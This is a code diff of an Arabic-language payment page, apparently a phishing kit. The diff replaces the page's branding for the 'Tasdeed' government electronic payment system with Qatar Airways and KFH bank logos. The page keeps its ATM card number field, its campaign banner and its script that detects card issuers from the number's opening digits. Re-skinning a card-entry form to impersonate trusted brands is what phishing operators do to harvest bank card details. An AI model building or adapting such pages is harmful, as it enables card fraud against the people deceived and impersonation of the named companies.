@@ -18,20 +18,25 @@
             padding: 10px; 
         }
         
-        .container { width: 100%; max-width: 340px; } /* Smaller overall width */
+        .container { width: 100%; max-width: 340px; }
         
-        /* Banner Area - Enlarged, No Black Border */
+        /* Banner Area - Full Visibility, Enlarged */
         .banner-box { 
             width: 100%; 
             margin-bottom: 12px; 
             border-radius: 10px; 
             overflow: hidden; 
             box-shadow: 0 4px 10px rgba(0,0,0,0.2); 
-            border: none; /* Removed black border */
+            background: #fff;
         }
-        .banner-box img { width: 100%; display: block; transform: scale(1.1); } /* Enlarged */
+        .banner-box img { 
+            width: 100%; 
+            height: auto; 
+            display: block; 
+            object-fit: contain; /* Ensure full visibility */
+        }
         
-        /* Sleek 3-Card Structure - Smaller and Compact */
+        /* Sleek 3-Card Structure - Compact */
         .card { 
             background: #ffffff; 
             border-radius: 12px; 
@@ -41,23 +46,19 @@
             border: 1.5px solid #000; 
         }
         
-        /* Branding Header */
+        /* Branding Header - Qatar Airways & KFH */
         .header-logos { 
             display: flex; 
-            justify-content: center; 
+            justify-content: space-between; 
             align-items: center; 
             margin-bottom: 15px; 
+            padding: 5px 0;
         }
         
-        .tasdeed-side { text-align: right; order: 1; }
-        .tasdeed-side .ar { color: #c5a059; font-size: 20px; font-weight: bold; line-height: 0.9; }
-        .tasdeed-side .en { color: #c5a059; font-size: 13px; line-height: 0.9; letter-spacing: 1px; }
+        .qatar-logo { height: 35px; order: 1; }
+        .kfh-logo { height: 30px; order: 3; }
         
         .divider { width: 1.5px; height: 30px; background: #ccc; margin: 0 10px; order: 2; }
-        
-        .gov-side { text-align: left; line-height: 1.2; order: 3; }
-        .gov-side .red { color: #d9534f; font-size: 10px; font-weight: bold; }
-        .gov-side .black { color: #333; font-size: 10px; font-weight: bold; }
 
         /* Row Layout - Compact */
         .row { 
@@ -133,7 +134,7 @@
         .footer-text { margin-top: 15px; text-align: center; color: #333; font-size: 11px; line-height: 1.5; }
         .footer-text b { color: #0056b3; }
 
-        /* Suggestions List - Enhanced for Visibility */
+        /* Suggestions List */
         .suggestions {
             position: absolute;
             top: 30px;
@@ -167,24 +168,17 @@
 </head>
 <body>
     <div class="container">
-        <!-- Enlarged Banner, No Border -->
+        <!-- Banner - Full Visibility -->
         <div class="banner-box">
             <img src="images/adds/NewDerayaCamp/pc.jpg" alt="Campaign Banner">
         </div>
 
-        <!-- Card 1: Branding & Info (Smaller) -->
+        <!-- Card 1: Branding & Info -->
         <div class="card">
             <div class="header-logos">
-                <div class="tasdeed-side">
-                    <div class="ar">تسديد</div>
-                    <div class="en">tasdeed</div>
-                </div>
+                <img src="images/logos/qatar_airways.png" class="qatar-logo" alt="Qatar Airways">
                 <div class="divider"></div>
-                <div class="gov-side">
-                    <div class="red">نظام الدفع</div>
-                    <div class="black">الإلكتروني</div>
-                    <div class="red">الحكومي</div>
-                </div>
+                <img src="images/logos/kfh.png" class="kfh-logo" alt="KFH">
             </div>
             
             <div class="row">
@@ -197,7 +191,7 @@
             </div>
         </div>
 
-        <!-- Card 2: Details (Smaller) -->
+        <!-- Card 2: Details -->
         <div class="card">
             <div class="row">
                 <span class="label">رقم بطاقة الصراف الآلي:</span>
@@ -227,7 +221,7 @@
             </div>
         </div>
 
-        <!-- Card 3: Buttons (Smaller) -->
+        <!-- Card 3: Buttons -->
         <div class="card card-btns">
             <div class="btn-flex">
                 <button class="action-btn">إرسال</button>
@@ -266,7 +260,6 @@
                 
                 let detected = false;
                 if (raw.length >= 1) {
-                    // Check full cardData
                     const match = cardData.sort((a,b) => b.bin.length - a.bin.length).find(c => raw.startsWith(c.bin));
                     if (match) {
                         logoImg.attr('src', match.logo).show();
